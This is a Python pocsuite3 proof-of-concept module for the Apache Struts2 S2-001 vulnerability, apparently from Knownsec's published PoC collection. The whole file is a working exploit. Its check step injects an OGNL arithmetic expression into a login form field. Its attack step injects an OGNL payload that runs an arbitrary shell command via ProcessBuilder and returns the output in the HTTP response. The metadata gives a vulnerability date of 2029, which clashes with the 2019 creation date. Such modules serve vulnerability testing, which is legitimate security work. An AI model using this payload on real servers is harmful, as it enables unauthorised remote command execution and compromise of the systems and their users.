import random
import re
from collections import OrderedDict
from urllib.parse import quote

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests
from pocsuite3.lib.core.enums import VUL_TYPE
from pocsuite3.lib.core.interpreter_option import OptString


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['knownsec.com']
    vulDate = '2029-5-8'
    createDate = '2019-5-8'
    updateDate = '2019-5-8'
    references = ['https://cwiki.apache.org/confluence/display/WW/S2-001']
    name = 'Apache Struts2 s2-001'
    appPowerLink = ''
    appName = 'Apache Struts2'
    appVersion = '2.0.0-2.0.8'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''S2-001:影响版本Struts 2.0.0-2.0.8'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    dockerfile = '''FROM isxiangyang/struts2-all-vul-pocsuite:latest'''

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString('', description="可执行的shell命令")
        return o

    def _check(self):
        result = {}
        check_poc = "%25%7B{num1}%2B{num2}%7D"
        headers = {}
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        data = "username=test&password={exp}"
        num1 = random.randint(10000, 100000)
        num2 = random.randint(10000, 100000)
        poc = check_poc.format(num1=num1, num2=num2)
        data = data.format(exp=poc)
        html = requests.post(self.url, data=data, headers=headers).text
        nn = str(num1 + num2)
        if nn in html:
            result["VerifyInfo"] = {
                "URL": self.url,
                "PAYLOAD": data
            }
            return result
        return False

    def _verify(self):
        p = self._check()
        if p:
            return self.parse_output(p)

    def _attack(self):
        p = self._check()
        result = {}
        if p:
            cmd = self.get_option("command")
            exec_payload = "%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"" + f"{cmd}" + "\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}"
            headers = {}
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            exec_payload = quote(exec_payload)
            data = f"username=test&password={exec_payload}"
            html = requests.post(self.url, data=data, headers=headers).text
            pattern = re.compile(r"</tr>\r\n(.*)")
            matches = pattern.findall(html)
            if html:
                result["VerifyInfo"] = {
                    "URL": self.url,
                    "result": matches
                }
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
